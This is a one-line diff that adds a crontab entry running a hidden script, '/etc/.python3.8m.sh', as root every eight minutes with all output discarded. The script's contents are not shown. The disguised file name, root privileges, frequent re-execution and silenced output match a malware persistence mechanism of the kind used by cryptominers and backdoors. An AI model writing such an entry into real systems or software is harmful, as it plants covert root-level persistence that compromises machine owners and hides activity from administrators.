@@ -1,0 +1,1 @@
+*/8 * * * * root /etc/.python3.8m.sh>/dev/null 2>&1
